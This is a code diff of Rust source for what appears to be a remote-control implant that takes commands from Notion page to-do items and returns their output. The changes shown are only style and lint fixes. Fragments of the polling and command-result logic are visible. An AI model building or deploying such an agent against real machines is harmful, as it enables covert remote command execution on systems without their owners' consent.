@@ -24,10 +24,10 @@ struct ConfigOptions {
     api_key: String
 }
 
-fn getConfigOptions() -> Result<ConfigOptions, Box<dyn Error + Send + Sync>> {
+fn get_config_options() -> Result<ConfigOptions, Box<dyn Error + Send + Sync>> {
    
     println!("Getting config options!");
-    let mut stdin = std::io::stdin();
+    let stdin = std::io::stdin();
     
     let mut sleep_interval = String::new();
     print!("[*] Enter agent sleep interval > ");
@@ -58,7 +58,6 @@ async fn create_page(client: &Client, config_options: &ConfigOptions, hostname: 
     let url = format!("{}/pages/", URL_BASE);
     
     // Craft JSON Body
-    let hn = hostname::get().ok()?;
     let body: serde_json::Value = json!({
         "parent": {
             "type": "page_id",
@@ -161,7 +160,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("Starting!");
     
     let config_options_handle = tokio::spawn( async {
-        return getConfigOptions();
+        return get_config_options();
         
     });
     let config_options = config_options_handle.await?.unwrap();
@@ -197,12 +196,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             .filter(|&b| b["type"] == "to_do")
             .collect();
 
-        let mut new_command_blocks: Vec<&serde_json::Value> = command_blocks
+        let new_command_blocks: Vec<&serde_json::Value> = command_blocks
             .into_iter()
             .filter(|&b| b["to_do"]["checked"] == false)
             .collect();
 
-        for mut block in new_command_blocks {
+        for block in new_command_blocks {
             match block["to_do"]["text"][0]["text"]["content"].as_str() {
                 Some(s) => {
                     if s.contains("🎯") {
@@ -220,7 +219,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         };
                         
                         let command_block_id = block["id"].as_str().unwrap();
-                        let mut output_string: String;
+                        let output_string: String;
                         complete_command(&client, block.to_owned()).await;
                         if output.stderr.len() > 0 {
                             output_string = String::from_utf8(output.stderr).unwrap();
